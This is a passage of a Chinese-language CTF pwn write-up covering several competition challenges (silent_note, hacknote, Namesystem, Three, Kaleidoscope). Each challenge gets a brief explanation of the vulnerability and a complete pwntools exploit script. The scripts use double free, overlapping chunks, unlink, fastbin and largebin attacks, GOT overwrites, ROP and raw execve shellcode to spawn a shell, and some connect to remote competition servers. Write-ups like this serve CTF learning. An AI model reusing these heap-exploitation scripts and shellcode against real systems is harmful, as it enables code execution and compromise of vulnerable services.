        Login(4,0x20,'1'*8+'1'*1+p8(i)+payload)
        if "success" in p.recvline():
            payload = p8(i) + payload
            break
    libc_base = u64(('\x78'+payload).ljust(8,'\x00')) - 88 - libc.sym['__malloc_hook'] - 0x10
    log.success("libc base => " + hex(libc_base))
    Delete(0)
    Register(5,0x18,p64(0x00603000)+p64(libc_base+gadgets[1]))
    #gdb.attach(p,'b* 0x400be7')
    Login(1,0x20,'\x00')



    p.interactive()

exp()

```

### silent_note

只能calloc 0x28或者0x208，删除里有double free，构造Overlapping chunk，unlin再编辑即可

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug == 1:

    p = process('./pwn')
elif debug == 2:
    p = process('./pwn',env={'LD_PRELOAD':'./libc.so'})
else:
    p = remote('8sdafgh.gamectf.com',35555)

def Add(size,content):
    p.recvuntil('4.Exit\n')
    p.sendline('1')
    p.recvuntil("Which kind of note do you want to add?\n")
    if size == 0x28:
        p.sendline('1')
    elif size == 0x208:
        p.sendline('2')
    else:
        print "size illegal"
    p.recvuntil("Content:\n")
    p.sendline(content)

def Update(idx,content):
    p.recvuntil('4.Exit\n')
    p.sendline('3')
    p.recvuntil("Which kind of note do you want to update?")
    p.sendline(str(idx))
    p.recvuntil("Content:\n")
    p.sendline(content)

def Delete(idx):
    p.recvuntil('4.Exit\n')
    p.sendline('2')
    p.recvuntil("Which kind of note do you want to delete?")
    p.sendline(str(idx))

def exp():
    #leak libc

    bss1 = 0x6020d0
    bss2 = 0x6020d8
    Add(0x208,'0')
    Add(0x28,'1')
    Add(0x28,'1')
    Delete(2)
    Add(0x28,'2')
    Add(0x28,'3')

    for i in range(9):
        Add(0x28,'0')
    Update(2,p64(0)+p64(0x21)+p64(bss2-0x18)+p64(bss2-0x10)+p64(0x20)+p64(0x31)+p64(0x31)*(0x1a0/8)+p64(0x1d0)+p64(0x90))

    Delete(1)


    Update(2,"/bin/sh\x00"+p64(0)+p64(elf.got['free']))

    Update(1,p64(elf.plt['puts']))

    Update(2,"/bin/sh\x00"+p64(0)+p64(elf.got['puts']))

    Delete(1)
    p.recvuntil("2.Large\n")
    libc_base = u64(p.recvline().strip("\n").ljust(8,'\x00')) - libc.sym['puts']
    log.success("libc base => " + hex(libc_base))
    Update(2,"/bin/sh\x00"+p64(0)+p64(elf.got['free'])+p64(0x6020c0))
    Update(1,p64(libc_base+libc.sym['system']))
    Delete(2)
    p.interactive()

exp()
```

## 湖湘杯复赛

### hacknote

静态编译，第一种解法找到malloc_hook和free_hook，Edit里的strlen会导致溢出，构造Overlapping chunk之后fastbin attack到malloc_hook(0x42的fake chunk size)，写shellcode并把malloc_hook改成sc地址，第二种是largebin attack改bk和Bk_nextsize到malloc_hook，使得mallok_hook里写ub的地址，ub里写sc即可
第一种：
```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./HackNote')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./HackNote')

else:
    p = remote('183.129.189.62',13504)

def Add(size,note):
    p.recvuntil('-----------------\n')
    p.sendline('1')
    p.recvuntil("Input the Size:\n")
    p.sendline(str(size))
    p.recvuntil("Input the Note:\n")
    p.send(note)

def Delete(index):
    p.recvuntil('-----------------\n')
    p.sendline('2')
    p.recvuntil("Input the Index of Note:\n")
    p.sendline(str(index))

def Edit(index,note):
    p.recvuntil('-----------------\n')
    p.sendline('3')
    p.recvuntil("Input the Index of Note:\n")
    p.sendline(str(index))
    p.recvuntil("Input the Note:\n")
    p.send(note)

def exp():
    #leak libc
    free_hook = 0x6cd5e8
    malloc_hook = 0x6cb788
    #
    fake_chunk = 0x6cb772
    Add(0x88,'0'*8+'\n')
    Add(0xf8,'1'*8+'\n')
    Add(0x38,'2'*8+'\n')
    Add(0x38,'3'*8+'\n')
    Edit(0,'0'*0x88)
    Edit(0,'0'*0x80+'a'*8+p64(0x100+0x40+1)[:2])

    Delete(2)

    Delete(1)

    Add(0x100+0x30,'1'*0xf0+'a'*8+p64(0x41)+p64(fake_chunk)+'\n')

    Add(0x38,p64(fake_chunk)+'\n')
    sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    Add(0x38,'3'*6+p64(malloc_hook+8)+sc+'\n')
    #gdb.attach(p)

    p.recvuntil('-----------------\n')
    p.sendline('1')
    p.recvuntil("Input the Size:\n")
    p.sendline(str(30))

    p.interactive()

exp()

```

第二种：
```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./HackNote')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./HackNote')

else:
    p = remote('183.129.189.62',13504)

def Add(size,note):
    p.recvuntil('-----------------\n')
    p.sendline('1')
    p.recvuntil("Input the Size:\n")
    p.sendline(str(size))
    p.recvuntil("Input the Note:\n")
    p.send(note)

def Delete(index):
    p.recvuntil('-----------------\n')
    p.sendline('2')
    p.recvuntil("Input the Index of Note:\n")
    p.sendline(str(index))

def Edit(index,note):
    p.recvuntil('-----------------\n')
    p.sendline('3')
    p.recvuntil("Input the Index of Note:\n")
    p.sendline(str(index))
    p.recvuntil("Input the Note:\n")
    p.send(note)

def exp():
    #leak libc
    free_hook = 0x6cd5e8
    malloc_hook = 0x6cb788
    #
    Add(0x318,'0'*8+'\n')#0
    Add(0xf8,'1'*8+'\n')#1
    Add(0x438,'2'*8+'\n')#2
    Add(0x88,'3'*8+'\n')#3
    Add(0xf8,'4'*8+'\n')#4
    Add(0x448,'5'*8+'\n')#5
    Add(0x68,'6'*8+'\n')#6
    #overlapping
    Edit(0,'0'*0x318)
    Edit(0,'0'*0x310+p64(0)+'\x41\x05')

    Delete(1)
    Add(0x530,'1'*8+'\n')#1 == chunk1 + chunk2
    #
    Edit(3,'3'*0x88)
    Edit(3,'3'*0x80+p64(0)+'\x51\x05')
    Delete(4)
    Add(0x540,'4'*8+'\n')#4 == chunk4 + chunk5
    Delete(0)
    Delete(2)
    Add(0x30,'0'*8+'\n')#0

    Delete(5)
    Edit(1,'1'*0xf0+p64(0)+p64(0x441)+p64(0)+p64(malloc_hook-0x10)+p64(0)+p64(malloc_hook)+'\n')
    Add(0x30,'2'*8+'\n')#2
    Edit(4,'4'*0xf0+asm(shellcraft.sh())+'\n')
    gdb.attach(p)
    p.recvuntil('-----------------\n')
    p.sendline('1')
    p.recvuntil("Input the Size:\n")
    p.sendline(str(0x30))

    p.interactive()

exp()

```

### Namesystem

没开PIE，got表可写，删除时候从后往前写，chunk_list满的时候会造成重合chunk，最后fastbin attack三次，分别将chunk_list[0]改成puts@got，free@got到puts@plt，泄露出地址再改free到system即可

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./NameSystem')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:

    p = process('./NameSystem')

else:
    p = remote('183.129.189.62',16205)

def Add(size,name):
    p.recvuntil('Your choice :\n')
    p.sendline('1')
    p.recvuntil("Name Size:")
    p.sendline(str(size))
    p.recvuntil("Name:")
    p.send(name)

def Delete(index):
    p.recvuntil('Your choice :\n')
    p.sendline('3')
    p.recvuntil("The id you want to delete:")
    p.sendline(str(index))

def exp():
    #leak libc
    count = 10
    for i in range(count):
        Add(0x60,str(i)+'\n')
    for i in range(count):
        Delete(count-i-1)
    #
    for i in range(20-count):
        Add(0x50,p64(0x71)*(0x50/8))
    for i in range(count):
        Add(0x60,p64(0x71)*(0x60/8))
    Delete(18)

    Delete(19)
    Delete(17)
    Delete(17)
    #
    Delete(0)
    Delete(1)
    Delete(2)
    Delete(3)

    Add(0x60,p64(0x60208d)+'\n')
    Add(0x60,'a\n')
    Add(0x60,'a\n')
    Add(0x60,'a'*3+p64(elf.got['puts'])[:-1]+'\n')
    #
    fake_chunk = 0x601ffa
    Add(0x50,'a\n')
    Add(0x50,'a\n')
    Add(0x50,'a\n')
    Delete(18)
    Delete(19)
    Delete(17)
    Delete(17)
    Delete(7)
    Delete(8)
    Delete(9)
    Add(0x50,p64(fake_chunk)+'\n')
    Add(0x50,'a\n')
    Add(0x50,'a\n')
    Add(0x38,'a\n')
    Add(0x38,'a\n')
    Add(0x38,'a\n')


    Delete(18)
    Delete(19)
    Delete(17)
    Delete(17)
    #
    Delete(8)
    Delete(9)


    Add(0x58,'a'*14+p64(elf.plt['puts'])[:-1]+'\n')
    Delete(0)
    #
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - libc.sym['puts']
    libc.address = libc_base
    log.success("libc base => " + hex(libc_base))
    #get shell
    fake_chunk = 0x602022

    Add(0x38,p64(fake_chunk)+'\n')
    Add(0x38,'a\n')
    Add(0x38,'a\n')
    Add(0x38,'a'*6+p64(libc.sym['printf'])+p64(libc.sym['alarm'])+p64(libc.sym['read'])+p64(libc.sym['__libc_start_main'])+p64(libc.sym['malloc'])+p64(libc.sym['system'])+'\n')
    #gdb.attach(p)
    p.recvuntil("Your choice :\n")
    p.send("/bin/sh\x00")

    p.interactive()

exp()
```

## 红帽杯

### Three

允许写三字节sc，跳到我们的输入地址栈迁移getshell

```py
#coding=utf-8
from pwn import *
context.update(arch='i386',os='linux',log_level='debug')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if debug:
    p = process('./pwn')
else:
    p = remote('47.104.190.38',12001)

def exp():
    #leak libc
    p_esp_add_esp_8_p = 0x080bf282
    p_eax = 0x080c11e6
    p_esp = 0x080a9051
    p_edx_ecx_ebx = 0x08072fb1
    syscall_ret = 0x080738c0
    #gdb.attach(p,'b* 0x08048c5b')
    p.recvuntil("Give me a index:\n")
    p.sendline('1')
    p.recvuntil("Three is good number,I like it very much!\n")
    p.send(asm('push ecx;jmp DWORD ptr[ecx]'))
    p.recvuntil("Leave you name of size:")
    p.sendline(str(0x200))
    p.recvuntil("Tell me:")
    #
    payload = p32(p_esp_add_esp_8_p)+'a'*8+p32(p_eax)+p32(0xb)+p32(p_edx_ecx_ebx)+p32(0)*2
    off = len(payload)
    payload += p32(0x080f6cc0+off+8)+p32(syscall_ret)+"/bin/sh\00"
    p.send(payload)
    p.interactive()

exp()
```

### 万花筒

#### 前言

一道llvm题目，赛后看了陆晨学长给的wp，是llvmcookbook的示例改的，toy语言，看Kaleidoscope这个名字应该就可以找到教程，gettok里定义了一些标识符，在划分语元的时候使用，这里有def、extern、if等。

我们定义一个与库函数名相同函数体为空的函数，第一次调用会报错``Error: Unknown unary operator``，之后可以成功调用到该库函数，学长给的wp通过泄露libc执行syetm(binsh_addr)，预期解是mmap一块区域，读入"/bin/sh"，之后system(map_addr)

#### exp.py

```py
from pwn import *
#coding=utf-8
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal=['tmux','split','-h']
debug = 1
if debug:
    p = process("./pwn")

def cmd(payload):
    p.recvuntil("ready> ")
    p.sendline(payload)

def exp():
    #mmap
    cmd("def mmap(a b c d e f);")
    cmd("mmap(0,0,0,0,0,0);")
    cmd("mmap("+str(0x10000)+","+str(0x2000)+",3,34,0,0);")
    #read
    cmd("def read(a b c);")
    cmd("read(0,0,0);")
    cmd("read(0,"+str(0x10000)+",8);")
    p.send("/bin/sh\x00")
    #system
    cmd("def system(a);")
    cmd("system(0);")
    cmd("system("+str(0x10000)+");")
    #gdb.attach(p)
    p.interactive()

exp()
```
